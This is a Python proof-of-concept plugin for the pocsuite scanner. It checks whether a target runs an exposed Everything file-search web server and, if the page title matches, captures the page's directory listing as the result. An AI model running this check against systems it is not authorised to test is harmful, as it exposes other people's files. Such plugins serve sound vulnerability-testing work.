#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class EverythingPOC(POCBase):
    vulID = '19'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-12-12' #漏洞公开的时间,不知道就写今天

    author = 'colorway' #  PoC作者的大名
    createDate = '2017-12-12'# 编写 PoC 的日期
    updateDate = '2017-12-12'# PoC 更新的时间,默认和编写时间一样
    references = 'https://jingyan.baidu.com/article/915fc414baf0be51384b206a.html'# 漏洞地址来源,0day不用写
    name = 'Everything Directory list'# PoC 名称
    appPowerLink = 'http://www.voidtools.com/'# 漏洞厂商主页地址
    appName = 'Everything'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'info-disclosure'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        everything敏感文件漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危
    
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        try:
            r = req.get(vul_url)
            r_content = r.content
            import re
            title =re.findall(r"<title>(.*)</title>",r_content)[0]
            #print title
            if "Everything" in title:
                #print u"发现漏洞"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = vul_url + str(r_content)             
        except Exception, e:
            raise e
        print '[+]19 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(EverythingPOC)

